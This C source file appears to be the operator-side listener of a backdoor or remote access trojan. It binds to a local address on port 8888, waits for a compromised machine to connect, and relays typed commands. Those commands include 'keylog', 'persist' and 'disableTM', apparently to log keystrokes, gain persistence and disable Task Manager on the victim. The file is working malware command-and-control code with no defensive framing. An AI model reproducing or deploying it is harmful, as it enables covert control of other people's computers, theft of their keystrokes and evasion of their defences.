#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main()
{
	int sock, client_socket;
	char buffer[1024];
	char response[18384];
	struct sockaddr_in server_address, client_address;
	int i=0;
	int optval=1;

	socklen_t client_length;
	sock = socket(AF_INET, SOCK_STREAM,0);
	
	/*The setsockopt() call sets options associated with a socket
	SOL_SOCKET is the socket layer itself. It is used for options that are protocol independent.
	This option controls whether 'bind' should permit reuse of local addresses for this socket.
	optval is where the result is stored
	*/
	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval))<0) 
	{
		printf("[-] Error Setting TCP Socket Options !\n");
		return 1;
	}

	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = inet_addr("192.168.56.1");
	server_address.sin_port = htons(8888);  //Change This

	bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));

	printf("\033[1;32m");
	printf("[+] Welcome Neo\n[+] We Are Listening For Connections\n");
	printf("\033[0m");

	listen(sock,5);
	client_length = sizeof(client_address);
	client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);
	printf("\033[1;36m");
	printf("[+] %s is Live \n",inet_ntoa(client_address.sin_addr));
	printf("\033[0m");
	while(1)
	{
		jump:
		bzero(&buffer, sizeof(buffer));
		bzero(&response, sizeof(response));
		printf("\n[%s] > ",inet_ntoa(client_address.sin_addr));
		fgets(buffer,sizeof(buffer), stdin);
		strtok(buffer,"\n");
		write(client_socket,buffer, sizeof(buffer));

		if (strncmp("quit", buffer , 4)==0)
		{
			break;
		}

		//These Commands Dont return anything so we go to jump
		else if (strncmp("cd ",buffer,3) ==0 )
		{
			goto jump;
		}
		else if (strncmp("keylog",buffer,6) ==0 )
		{
			goto jump;
		}
		else if (strncmp("persist",buffer,7) == 0 )
		{
			recv(client_socket, response, sizeof(response),0);
			printf("%s", response);
		}
		else if (strncmp("disableTM",buffer,9) == 0 )
		{
			recv(client_socket, response, sizeof(response),0);
			printf("%s", response);
		}
		else
		{
			recv(client_socket, response, sizeof(response), MSG_WAITALL);
			printf("%s", response);
		}

	}
}

